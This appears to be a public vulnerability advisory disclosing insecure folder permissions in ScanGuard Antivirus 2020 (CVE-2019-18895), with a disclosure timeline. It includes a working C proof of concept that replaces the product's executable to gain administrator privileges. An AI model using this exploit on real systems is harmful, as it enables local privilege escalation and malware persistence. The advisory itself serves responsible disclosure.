@@ -1,0 +1,160 @@
+# Exploit Title: ScanGuard Antivirus 2020 - Insecure Folder Permissions
+# Date: 2019-10-10
+# Exploit Author: hyp3rlinx
+# Vendor Homepage: https://www.scanguard.com/
+# Software Link: https://support.scanguard.com/en/kb/22/upgrades-available
+# Version: 2020
+# Tested on: Windows
+# CVE : N/A
+# Category: exploit
+
+
+SCANGUARD-ANTIVIRUS-INSECURE-PERMISSIONS.txt
+
+[+] Credits: hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/SCANGUARD-ANTIVIRUS-INSECURE-PERMISSIONS.txt
+[+] ISR: ApparitionSec          
+ 
+
+[Vendor]
+https://www.scanguard.com
+
+
+[Product]
+ScanGuard Antivirus
+ScanGuard_Setup.exe Hash: 1a63c67a249da0c2e9abd09d35c3c65d
+
+Complete Antivirus & Security Software
+
+
+[Vulnerability Type]
+Insecure Permissions
+
+
+[CVE Reference]
+CVE-2019-18895
+
+
+[Affected Product Code Base]
+ScanGuard Antivirus - latest
+
+
+[Affected Component]
+Permissions on installation directory
+
+
+[Attack Type]
+Local
+
+
+[Impact Code execution]
+true
+
+
+[Impact Escalation of Privileges]
+true
+
+
+[Impact Information Disclosure]
+true
+
+
+[Attack Vectors]
+Low integrity malware or non-privileged user replaces an executable to gain Admin privileges.
+
+
+[Reference]
+https://support.scanguard.com/en/kb/22/upgrades-available
+
+
+[Security Issue]
+Scanguard through 2019-11-12 on Windows has Insecure Permissions for the installation directory, leading to
+privilege escalation via a Trojan horse executable file.
+
+The product sets weak access control restrictions, as permissions are set to Full Control for Everyone group.
+This can allow low integrity malware the ability to replace ScanGuard executables.
+
+
+C:\Program Files (x86)\ScanGuard\bins BUILTIN\Users:(OI)(CI)(ID)F 
+                                      Everyone:(OI)(CI)(ID)F       
+                                      NT SERVICE\TrustedInstaller:(ID)F 
+                                      NT SERVICE\TrustedInstaller:(CI)(IO)(ID)F 
+                                      NT AUTHORITY\SYSTEM:(ID)F 
+
+
+[Exploit/POC]
+
+#include <stdio.h>
+#include <windows.h>
+#define TARGET "C:\\Program Files (x86)\\ScanGuard\\ScanGuard.exe"
+#define DISABLED_TARGET "C:\\Program Files (x86)\\ScanGuard\\~.conf"
+
+/* ScanGuard EoP 
+  PoC By hyp3rlinx */
+
+BOOL PWNED=FALSE;
+
+BOOL FileExists(LPCTSTR szPath){
+  DWORD dwAttrib = GetFileAttributes(szPath);
+  return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
+}
+
+void main(void){
+   
+  if(!FileExists(DISABLED_TARGET)){
+    rename(TARGET, DISABLED_TARGET);
+    printf("[+] ScanGuard Antivirus EoP PoC\n");
+    Sleep(300);
+    printf("[+] Disabled ScanGuard.exe ...\n");
+    Sleep(300);
+  }else{
+  	PWNED=TRUE;
+  }
+   
+  char fname[MAX_PATH];
+  char newLoc[]=TARGET;
+  
+  DWORD size = GetModuleFileNameA(NULL, fname, MAX_PATH);
+  if (size){
+     if(!PWNED){
+        printf("[+] Copying exploit to vuln dir...\n");
+        Sleep(300);
+        CopyFile(fname, newLoc, FALSE);
+        printf("[+] Replaced legit ScanGuard...\n");
+        Sleep(300);
+        printf("[+] Done!\n");
+        Sleep(300);
+        MoveFile(fname, "c:\\Program Files (x86)\\ScanGuard\\ScamGuard.lnk");
+        Sleep(2000);
+        exit(0);
+     }else{
+     	if(FileExists("ScamGuard.lnk")){
+	    system("DEL /f ScamGuard.lnk");
+	   }
+     	printf("[+] ScamGuard PWNED!!!");
+     	printf("[+] By hyp3rlinx\n");
+     	system("pause");
+     }
+  }
+}
+
+
+[Disclosure Timeline]
+Vendor Notification: September 16, 2019
+Received vendor acknowledgement: September 16, 2019
+Second contact follow up: September 29, 2019
+No more vendor replies.
+November 12, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
